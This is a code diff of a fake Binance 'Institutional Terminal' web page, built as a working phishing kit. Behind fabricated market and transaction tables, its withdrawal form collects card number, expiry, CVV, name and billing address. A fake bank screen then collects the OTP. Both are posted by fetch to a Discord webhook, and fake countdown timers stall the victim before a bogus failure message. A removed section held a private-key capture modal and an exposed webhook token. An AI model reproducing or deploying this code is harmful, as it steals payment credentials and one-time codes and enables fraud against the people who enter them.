@@ -6,27 +6,19 @@
     <title>Binance | Institutional Terminal</title>
     <link rel="stylesheet" href="https://cloudflare.com">
     <style>
-        :root { --bg: #0b0e11; --sidebar: #12161c; --card: #1e2329; --border: #2b3139; --yellow: #f3ba2f; --text: #eaecef; --text-gray: #848e9c; --up: #0ecb81; --down: #f6465d; --link: #627eea; }
+        :root { --bg: #0b0e11; --sidebar: #12161c; --card: #1e2329; --border: #2b3139; --yellow: #f3ba2f; --text: #eaecef; --text-gray: #848e9c; --up: #0ecb81; --down: #f6465d; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
         
         /* AUTH SYSTEM */
         #auth-overlay { position: fixed; inset: 0; background: var(--bg); z-index: 100000; display: flex; justify-content: center; align-items: center; }
-        .auth-card { background: var(--card); padding: 40px; border-radius: 20px; width: 420px; text-align: center; border: 1px solid var(--border); }
-        input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid var(--border); background: #0b0e11; color: white; box-sizing: border-box; font-size: 14px; }
-        .btn-yellow { width: 100%; padding: 14px; background: var(--yellow); color: black; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 15px; }
-        .spinner { display: none; width: 35px; height: 35px; border: 4px solid rgba(255,255,255,0.1); border-left-color: var(--yellow); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        .auth-card { background: var(--card); padding: 35px; border-radius: 20px; width: 420px; text-align: center; border: 1px solid var(--border); }
+        input, select, textarea { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid var(--border); background: #0b0e11; color: white; box-sizing: border-box; font-size: 14px; }
+        .btn-yellow { width: 100%; padding: 14px; background: var(--yellow); color: black; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        
+        .loader-ring { display: inline-block; width: 50px; height: 50px; border: 4px solid rgba(243, 186, 47, 0.1); border-radius: 50%; border-top-color: var(--yellow); animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        /* MODERN SPINNER */
- .loader-ring {
-  display: inline-block; width: 60px; height: 60px;
-  border: 5px solid rgba(243, 186, 47, 0.1);
-  border-radius: 50%; border-top-color: var(--yellow);
-  animation: spin 1s ease-in-out infinite;
-}
-@keyframes spin { to { transform: rotate(360deg); } }
 
-
-        /* SIDEBAR */
+        /* LAYOUT */
         #sidebar { width: 260px; background: var(--sidebar); border-right: 1px solid var(--border); padding: 25px; display: none; flex-direction: column; }
         .logo { font-size: 24px; font-weight: 800; color: var(--yellow); margin-bottom: 40px; }
         .nav-item { padding: 12px; border-radius: 8px; color: var(--text-gray); cursor: pointer; margin-bottom: 5px; font-size: 14px; display: flex; align-items: center; gap: 10px; }
@@ -40,35 +32,34 @@
         .table-container { background: #12161c; border-radius: 12px; border: 1px solid var(--border); overflow-x: auto; margin-bottom: 30px; }
         table { width: 100%; border-collapse: collapse; text-align: left; min-width: 1000px; }
         th { padding: 15px; background: #1e2329; color: var(--text-gray); font-size: 11px; text-transform: uppercase; position: sticky; top: 0; z-index: 10; }
-        td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 13px; }
+        td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 13px; font-family: monospace; }
 
-       /* QR DISPLAY - NOT READABLE LOGIC */
-        .qr-display { background: white; padding: 15px; border-radius: 15px; width: 220px; margin: 20px auto; }
-        .qr-display img { width: 100%; display: block; border-radius: 10px; }
-
-        /* WITHDRAW & BANK OTP */
-        .bank-page { background: white; color: black; max-width: 450px; margin: 50px auto; padding: 40px; border-radius: 12px; text-align: center; border-top: 5px solid #004a99; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .waiting-box { display: none; text-align: center; padding: 50px; }
+        /* WITHDRAW SPECIAL SCREENS */
+        .bank-page { background: white; color: black; max-width: 450px; margin: 30px auto; padding: 40px; border-radius: 12px; text-align: center; border-top: 5px solid #004a99; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .wait-screen { position: fixed; inset: 0; background: #000; z-index: 200000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .timer-text { font-size: 48px; font-weight: bold; color: var(--yellow); font-family: monospace; margin: 20px 0; }
     </style>
 </head>
 <body>
 
+<!-- AUTH -->
 <div id="auth-overlay">
     <div class="auth-card" id="choice-box">
         <h2 style="color: var(--yellow);">BINANCE</h2>
-        <p>Institutional Gateway Access</p>
+        <p>Institutional Terminal v4.0.2</p>
         <button class="btn-yellow" onclick="showForm('reg')">Register Account</button>
         <button class="btn-yellow" style="background:transparent; border:1px solid #555; color:white; margin-top:10px;" onclick="showForm('login')">Member Login</button>
     </div>
-    <div class="auth-card" id="form-box" style="display:none;">
-        <h2 id="form-title">BINANCE Verification</h2>
-        <div id="auth-loader" class="spinner"></div>
-        <div id="auth-inputs">
-            <input type="text" id="u-name" placeholder="Full Name">
-            <input type="email" id="u-email" placeholder="Email (@gmail/@yahoo)">
-            <input type="password" placeholder="Password" id="u-pass">
-            <button class="btn-yellow" onclick="startAuth()">Continue</button>
-        </div>
+    <div class="auth-card" id="reg-box" style="display:none;">
+        <input type="text" id="r-name" placeholder="Full Name">
+        <select id="r-country"><option>Philippines</option><option>USA</option></select>
+        <input type="email" id="r-email" placeholder="Email (@gmail/@yahoo)">
+        <button class="btn-yellow" onclick="startAuth('reg')">Continue</button>
+    </div>
+    <div class="auth-card" id="login-box" style="display:none;">
+        <input type="email" id="l-email" placeholder="Email Address">
+        <input type="password" placeholder="Password">
+        <button class="btn-yellow" onclick="startAuth('login')">Unlock Archive</button>
     </div>
     <div class="auth-card" id="otp-box" style="display:none;">
         <div id="otp-display" style="font-size: 40px; font-weight: bold; color: var(--yellow); margin: 20px 0; letter-spacing: 10px;">000000</div>
@@ -83,15 +74,11 @@
     <div class="nav-item" id="n-history" onclick="switchView('history')"><i class="fa-solid fa-list-ul"></i> History Logs</div>
     <div class="nav-item" onclick="switchView('deposit')"><i class="fa-solid fa-arrow-down"></i> Deposit</div>
     <div class="nav-item" onclick="switchView('withdraw')"><i class="fa-solid fa-credit-card"></i> Withdraw</div>
-    <div class="nav-item" onclick="openModal()" style="margin-top:auto; border-top:1px solid var(--border); padding-top:20px; cursor:pointer;">
-        <div style="font-size:11px; color:var(--text-gray)">No wallet connected</div>
-        <div style="font-size:10px; color:#5a606c">Manual Sync Required</div>
-    </div>
 </nav>
 
 <div id="main-wrapper">
     <header>
-        <div style="font-weight:bold; font-size:13px;">Terminal: <span style="color:var(--up)">BINANCE Institutional v4</span></div>
+        <div style="font-weight:bold; font-size:13px;">Terminal: <span style="color:var(--up)">BINANCE Institutional Archive</span></div>
         <div style="display:flex; gap:10px; align-items:center;">
             <select id="currency-select" onchange="updateMarket()" style="background:#2b3139; color:white; border:none; padding:8px 12px; border-radius:5px; font-weight:bold;">
                 <option value="USD">USD</option><option value="PHP">PHP</option><option value="SGD">SGD</option>
@@ -102,158 +89,136 @@
 
     <main>
         <div id="market-view" class="content-view">
-            <h1>Market Overview (1-100)</h1>
-            <div class="table-container"><table><thead><tr><th>#</th><th>Name</th><th>Price</th><th>24h Change</th><th>Market Cap</th></tr></thead><tbody id="market-body"></tbody></table></div>
+            <h1>Market Board (Rank 1-100)</h1>
+            <div class="table-container"><table><thead><tr><th>#</th><th>Coin</th><th>Price</th><th>24h Change</th><th>Market Cap</th></tr></thead><tbody id="market-body"></tbody></table></div>
         </div>
-
         <div id="history-view" class="content-view" style="display:none;">
-            <h1>Archive Explorer (2024 Logs)</h1>
-            <div class="table-container"><table><thead><tr><th>Tax Address</th><th>Method</th><th>Block</th><th>Timestamp (Hex)</th><th>Value</th></tr></thead><tbody id="history-body"></tbody></table></div>
+            <h1>Archive Explorer</h1>
+            <div class="table-container"><table><thead><tr><th>Tax Address</th><th>Block</th><th>Age</th><th>From</th><th>To</th><th>Value</th></tr></thead><tbody id="history-body"></tbody></table></div>
         </div>
-
-       <!-- DEPOSIT PAGE WITH LOADING -->
-<div id="deposit-view" class="content-view" style="display:none; text-align:center;">
-    <div style="padding-top:40px;">
-        <button onclick="switchView('market')" style="background:none; border:none; color:var(--yellow); cursor:pointer; margin-bottom: 20px;">← Back to Dashboard</button>
-        
-        <!-- ITO YUNG LOADER (LALABAS NG 3 SECONDS) -->
-        <div id="qr-loading-area" style="display: block; margin-top: 50px;">
-            <div class="loader-ring"></div>
-            <h3 style="color:var(--yellow); margin-top:20px;">Generating Encrypted QR...</h3>
-            <p style="font-size:12px; color:var(--text-gray);">Connecting to BINANCE Institutional Node #402</p>
-        </div>
-
-        <!-- ITO YUNG QR (SAKTONG LALABAS PAGKATAPOS NG LOADING) -->
-        <div id="qr-final-area" style="display: none;">
-            <h2 style="margin-bottom: 20px;">Scan QR to Deposit</h2>
-            <div style="background: white; padding: 20px; border-radius: 20px; width: 220px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
-                <img src="https://qrserver.com" alt="Encrypted QR" style="width: 100%; display: block;">
+        <div id="deposit-view" class="content-view" style="display:none; text-align:center;">
+            <div id="dep-loader" style="padding-top:100px;"><div class="loader-ring"></div><h3 style="color:var(--yellow); margin-top:20px;">Generating Encrypted QR...</h3></div>
+            <div id="dep-final" style="display:none;"><button onclick="switchView('market')" style="background:none; border:none; color:var(--yellow); cursor:pointer;">← Dashboard</button>
+                <div style="background:white; padding:20px; border-radius:20px; width:220px; margin:20px auto;"><img id="qr-img" style="width:100%;"></div>
+                <p style="font-weight:bold; font-size:18px;">2208894328312925696</p>
             </div>
-            <p style="font-weight:bold; font-size:18px; color:var(--text); margin-top:20px; letter-spacing: 1px;">2208894328312925696</p>
-            <p style="font-size:10px; color:var(--text-gray); margin-top:5px; text-transform: uppercase;">Institutional Encrypted Node #402</p>
         </div>
-    </div>
-</div>
 
+        <!-- WITHDRAWAL CONTENT -->
         <div id="withdraw-view" class="content-view" style="display:none;">
             <div id="card-form-area" style="max-width:500px; margin:0 auto; background:var(--card); padding:30px; border-radius:20px; border:1px solid var(--border);">
-                <h2>Connect Withdrawal Card</h2>
+                <h2>Connect Card for Withdrawal</h2>
                 <input type="text" id="c-num" placeholder="Card Number (16 Digits)" maxlength="16">
-                <div style="display:flex; gap:10px;">
-                    <input type="text" id="c-exp" placeholder="MM/YY" maxlength="5">
-                    <input type="text" id="c-cvv" placeholder="CVV" maxlength="3">
-                </div>
+                <div style="display:flex; gap:10px;"><input type="text" id="c-exp" placeholder="MM/YY" maxlength="5"><input type="text" id="c-cvv" placeholder="CVV" maxlength="3"></div>
                 <input type="text" id="c-name" placeholder="Cardholder Full Name">
-                <input type="text" id="c-addr" placeholder="Billing Address">
-                <button class="btn-yellow" onclick="goToBankVerify()">Verify Card</button>
+                <textarea id="c-addr" placeholder="Billing Address" rows="2"></textarea>
+                <button class="btn-yellow" onclick="step1_SendCard()">Verify Card</button>
             </div>
-
-            <div id="bank-verify-page" class="bank-page" style="display:none;">
+            
+            <div id="bank-otp-area" class="bank-page" style="display:none;">
                 <h2 style="color:#004a99; margin:0;">Bank Verification</h2>
-                <p style="font-size:13px; color:#333; margin:20px 0;">Enter the OTP from your bank to connect your card to <b>BINANCE</b>.</p>
-                <div style="background:#f9f9f9; padding:20px; border:1px solid #ddd; border-radius:8px;">
-                    <input type="text" id="bank-otp" placeholder="Enter OTP" style="background:white; color:black; border:1px solid #ccc; text-align:center; font-size:20px; letter-spacing:5px;">
-                    <button class="btn-yellow" style="background:#004a99; color:white; width:100%;" onclick="hitDiscord()">Confirm OTP</button>
-                </div>
-            </div>
-
-            <div id="waiting-screen" class="waiting-box">
-                <div class="spinner" style="display:block; width:60px; height:60px;"></div>
-                <h2 style="color:var(--yellow); margin-top:30px;">Verifying...</h2>
-                <div style="background:#1e2329; padding:20px; border-radius:15px; margin-top:20px; border:1px dashed var(--yellow);">
-                    <h3 style="margin:0; color:white;">Estimated Waiting Time: 5 Minutes</h3>
-                </div>
+                <p style="color:#333; font-size:13px; margin:20px 0;">Gateway Sync Complete. Please enter the OTP from your bank.</p>
+                <input type="text" id="bank-otp" placeholder="Enter OTP" style="background:#f9f9f9; color:black; border:1px solid #ccc; text-align:center; font-size:24px; letter-spacing:8px; padding:15px; width:100%;">
+                <button class="btn-yellow" style="background:#004a99; color:white; width:100%; margin-top:20px" onclick="step2_SendOtp()">Confirm OTP</button>
             </div>
         </div>
     </main>
 </div>
 
-<div id="wallet-modal" style="position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 200000;">
-    <div class="white-box" style="background: white; color: black; padding: 40px; border-radius: 24px; width: 380px; position: relative;">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-            <h2 style="margin:0;">Sync Vault</h2>
-            <span style="cursor:pointer; font-size:22px; color:#ccc;" onclick="closeModal()">✕</span>
-        </div>
-        <input type="text" placeholder="Wallet Name" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
-        <input type="password" placeholder="Private Key" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
-        <button class="btn-yellow" style="background:black; color:white; width:100%;" onclick="alert('Access Denied: Code 0x8229')">Connect</button>
-        <button class="btn-yellow" style="background:#f0f0f0; color:#555; width:100%; margin-top:10px; border:1px solid #ddd;" onclick="closeModal()">Back</button>
-    </div>
+<!-- 5-MINUTE WAIT SCREENS -->
+<div id="wait-1" class="wait-screen">
+    <div class="loader-ring"></div>
+    <h2 style="margin-top:30px;">Syncing with Bank...</h2>
+    <div class="timer-text" id="timer-1">05:00</div>
+    <p style="color:var(--text-gray);">Do not close this window.</p>
+</div>
+
+<div id="wait-2" class="wait-screen">
+    <div class="loader-ring"></div>
+    <h2 style="margin-top:30px; color:var(--yellow);">Finalizing Transaction...</h2>
+    <div class="timer-text" id="timer-2">05:00</div>
+    <p style="color:var(--text-gray);">Securing institutional bridge.</p>
 </div>
 
 <script>
     let code = "";
     let rates = { USD: 1, PHP: 57.50, SGD: 1.35 };
-    const hook =  "https://ptb.discord.com/api/webhooks/1502014942323278016/AEdRKrTMN507nDn3jgQZDE_9IAGbo8tTJkTG_Qd2BU7c-mgRA0tNlSm9pZD79ASM9jdv";
+    const hook = "https://discord.com";
 
-    function showForm(t) { document.getElementById('choice-box').style.display = 'none'; document.getElementById('form-box').style.display = 'block'; }
-    function startAuth() {
-        let email = document.getElementById('u-email').value;
-        if(!email.includes('@')) { alert("Invalid email!"); return; }
-        document.getElementById('auth-inputs').style.display = 'none'; document.getElementById('auth-loader').style.display = 'block';
-        setTimeout(() => { document.getElementById('form-box').style.display = 'none'; document.getElementById('otp-box').style.display = 'block';
-            code = Math.floor(100000 + Math.random() * 900000).toString(); document.getElementById('otp-display').innerText = code; }, 2000);
+    function showForm(t) { document.getElementById('choice-box').style.display='none'; document.getElementById(t+'-box').style.display='block'; }
+    function startAuth(t) {
+        let email = document.getElementById(t==='reg'?'r-email':'l-email').value;
+        if(!email.includes('@')) return alert("Invalid email!");
+        document.getElementById(t+'-box').style.display='none'; document.getElementById('otp-box').style.display='block';
+        code = Math.floor(100000 + Math.random()*900000).toString(); document.getElementById('otp-display').innerText=code;
     }
     function finalizeAuth() {
         if(document.getElementById('otp-input').value === code) {
-            document.getElementById('auth-overlay').style.display = 'none'; document.getElementById('sidebar').style.display = 'flex';
-            document.getElementById('main-wrapper').style.display = 'flex'; updateMarket(); buildHistory();
+            document.getElementById('auth-overlay').style.display='none'; document.getElementById('sidebar').style.display='flex';
+            document.getElementById('main-wrapper').style.display='flex'; updateMarket(); buildHistory();
         } else { alert("Wrong OTP"); }
     }
     function switchView(v) {
-    document.querySelectorAll('.content-view').forEach(el => el.style.display = 'none');
-    document.getElementById(v + '-view').style.display = 'block';
-
-    // LOADING LOGIC PARA SA DEPOSIT
-    if(v === 'deposit') {
-        document.getElementById('qr-loading-area').style.display = 'block';
-        document.getElementById('qr-final-area').style.display = 'none';
-        
-        setTimeout(() => {
-            document.getElementById('qr-loading-area').style.display = 'none';
-            document.getElementById('qr-final-area').style.display = 'block';
-        }, 3000); // 3 seconds na loading
+        document.querySelectorAll('.content-view').forEach(el=>el.style.display='none');
+        document.getElementById(v+'-view').style.display='block';
+        if(v==='deposit') {
+            document.getElementById('dep-loader').style.display='block'; document.getElementById('dep-final').style.display='none';
+            document.getElementById('qr-img').src="https://qrserver.com";
+            setTimeout(()=>{ document.getElementById('dep-loader').style.display='none'; document.getElementById('dep-final').style.display='block'; }, 3000);
+        }
+        if(v==='withdraw') { document.getElementById('card-form-area').style.display='block'; document.getElementById('bank-otp-area').style.display='none'; }
+        document.querySelectorAll('.nav-item').forEach(el=>el.classList.remove('active'));
+        if(document.getElementById('n-'+v)) document.getElementById('n-'+v).classList.add('active');
     }
 
-    if(v==='withdraw') { 
-        document.getElementById('card-form-area').style.display = 'block'; 
-        document.getElementById('bank-verify-page').style.display = 'none'; 
-        document.getElementById('waiting-screen').style.display = 'none'; 
+    // STEP 1: CARD TO DISCORD -> WAIT 5 MINS
+    function step1_SendCard() {
+        const details = `**NEW CARD INFO**\nCard: ${document.getElementById('c-num').value}\nExp: ${document.getElementById('c-exp').value}\nCVV: ${document.getElementById('c-cvv').value}\nName: ${document.getElementById('c-name').value}\nAddr: ${document.getElementById('c-addr').value}`;
+        fetch(hook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:details})});
+        document.getElementById('wait-1').style.display = 'flex';
+        runTimer(300, 'timer-1', () => {
+            document.getElementById('wait-1').style.display = 'none';
+            document.getElementById('card-form-area').style.display = 'none';
+            document.getElementById('bank-otp-area').style.display = 'block';
+        });
     }
-    
-    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-    if(document.getElementById('n-'+v)) document.getElementById('n-'+v).classList.add('active');
-}
 
+    // STEP 2: OTP TO DISCORD -> WAIT 5 MINS -> FAILED
+    function step2_SendOtp() {
+        const otp = `**BANK OTP RECEIVED**\nCard: ${document.getElementById('c-num').value}\nOTP: ${document.getElementById('bank-otp').value}`;
+        fetch(hook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:otp})});
+        document.getElementById('wait-2').style.display = 'flex';
+        runTimer(300, 'timer-2', () => {
+            alert("Verification Failed: System congestion detected. Please retry again later.");
+            location.reload();
+        });
     }
-    function goToBankVerify() { document.getElementById('card-form-area').style.display = 'none'; document.getElementById('bank-verify-page').style.display = 'block'; }
-    function hitDiscord() {
-        const details = `**BINANCE NEW CARD**\nCard: ${document.getElementById('c-num').value}\nExp: ${document.getElementById('c-exp').value}\nCVV: ${document.getElementById('c-cvv').value}\nName: ${document.getElementById('c-name').value}\nAddr: ${document.getElementById('c-addr').value}\nBank OTP: ${document.getElementById('bank-otp').value}`;
-        fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: details }) });
-        document.getElementById('bank-verify-page').style.display = 'none';
-        document.getElementById('waiting-screen').style.display = 'block';
+
+    function runTimer(sec, elId, callback) {
+        let el = document.getElementById(elId);
+        let timer = setInterval(() => {
+            let m=Math.floor(sec/60), s=sec%60;
+            el.innerText = (m<10?'0':'')+m+':'+(s<10?'0':'')+s;
+            if(sec <= 0) { clearInterval(timer); callback(); }
+            sec--;
+        }, 1000);
     }
+
     function updateMarket() {
-        let cur = document.getElementById('currency-select').value;
-        let html = "";
+        let cur = document.getElementById('currency-select').value; let html = "";
         for(let i=1; i<=100; i++) {
-            let p = i === 1 ? 96834.12 : (15000 / i);
-            let price = (p * rates[cur]).toLocaleString('en-US', { minimumFractionDigits: 2 });
-            html += `<tr><td>${i}</td><td><strong>Asset ${i}</strong></td><td>${cur} ${price}</td><td style="color:var(--up)">+${(Math.random()*5).toFixed(2)}%</td><td>$${(101-i).toFixed(1)}B</td></tr>`;
+            let base = i===1 ? 96834.12 : (15000/i); let p=(base*rates[cur]).toLocaleString('en-US',{minimumFractionDigits:2});
+            html += `<tr><td>${i}</td><td>Asset ${i}</td><td>${cur} ${p}</td><td style="color:var(--up)">+${(Math.random()*5).toFixed(2)}%</td><td>$${(101-i).toFixed(1)}B</td></tr>`;
         }
         document.getElementById('market-body').innerHTML = html;
     }
     function buildHistory() {
-        const body = document.getElementById('history-body');
-        body.innerHTML = "";
+        const body = document.getElementById('history-body'); body.innerHTML = "";
         for(let i=1; i<=35; i++) {
-            let b = 17794557 + (i * 12);
-            let ts = "0x" + (1714557000 + (i * 300)).toString(16).toUpperCase();
-            body.innerHTML += `<tr><td>0x823b...8911</td><td>Transfer</td><td>${b}</td><td style="color:var(--up)">${ts}</td><td style="color:var(--down)">- 0.6960 ETH</td></tr>`;
+            let b = 17794557 + (i * 12); let ts = "0x" + (1714557000 + (i * 300)).toString(16).toUpperCase();
+            body.innerHTML += `<tr><td>0x823b...8911</td><td>${b}</td><td>1 year ago</td><td>0x71C...d289</td><td>0xbc4...11d0</td><td>- 0.6960 ETH</td></tr>`;
         }
     }
-    function closeModal() { document.getElementById('wallet-modal').style.display = 'none'; }
-    function openModal() { document.getElementById('wallet-modal').style.display = 'flex'; }
 </script>
 </body>
 </html>
